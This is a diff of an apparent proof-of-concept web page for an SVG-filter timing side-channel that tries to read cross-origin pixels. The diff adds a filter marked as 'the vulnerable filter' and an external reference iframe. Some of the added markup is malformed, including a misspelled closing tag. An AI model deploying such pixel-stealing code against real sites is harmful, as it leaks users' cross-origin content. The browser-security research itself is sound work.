@@ -80,8 +80,8 @@ html, body {
 
   <body>
 
-    <div class="back">
-      <iframe id="frame" frameborder="0" scrolling="no" src="about:blank"></iframe>
+    <div>
+      <iframe id="frame" frameborder="1" scrolling="no" src="about:blank"></iframe>
       <div id="scroll"><div id="copy"></div></div>
       <svg>
         <!-- Color thresholding filters, force the image to black/white only -->
@@ -99,13 +99,34 @@ html, body {
       </svg>
       <svg height="0">
         <!-- *** This is the vulnerable filter *** -->
-        <filter id="timing">
+        <filter id="timing1">
         <feColorMatrix type="matrix" values="0 0 0  0 0
         0 0 0  0 0
         0 0 0  0 0
         1 1 1  0 0" />
 
         </filter>
+
+<filter id="timing" filterRes="172">
+ <feImage xlink:href="noise.png">
+ <feComposite in2="SourceGraphic" operator="arithmetic" k1="1">
+ <feMorphology operator="erode" radius="30">
+</filter>
+
+<filter id="timing1" color-interpolation-filters="sRGB">
+ <feColorMatrix type="matrix"
+ values="0.333 0.333 0.333 0 -.16
+ 0.333 0.333 0.333 0 -.16
+ 0.333 0.333 0.333 0 -.16
+ 0 0 0 0 1" />
+ <feComponentTransfer>
+ <feFuncR type="discrete" tableValues="1 0" />
+ <feFuncG type="discrete" tableValues="1 0" />
+ <feFuncB type="discrete" tableValues="1 0" />
+ </feCompnentTransfer>
+</filter>
+
+
       </svg>
     </div>
     <!-- <div class="back"> -->
@@ -118,7 +139,7 @@ html, body {
       <input id="size" type="text" value="500" hidden/><br/>
       <button onclick="run();">Run</button> <button onclick="halt();" hidden>Halt</button></br>
       Reference:<div id="mirrorlock" style="width:48px; height:48px; overflow:hidden;border-style:solid;border-color:red;"> 
-        <iframe id="framemirror" position="absolute" frameborder="0" scrolling="no" src="48px_wb_cb.html"></iframe>
+        <iframe id="framemirror" position="absolute" frameborder="0" scrolling="no" src="https://cseweb.ucsd.edu/~dkohlbre/floats/48px_wb_cb.html"></iframe>
       </div>
       Result:<div style="width:48px;height:48px;border-style:solid;border-color:green"><canvas id="canvas" width="48" height="48"></canvas></div>
       <br/>
@@ -129,6 +150,7 @@ html, body {
   </body>
 
   <script>
+var NS = "http://www.w3.org/2000/svg";
 var filter = document.getElementById("timing");
 
 var dlight = document.createElementNS(NS,"feSpecularLighting");
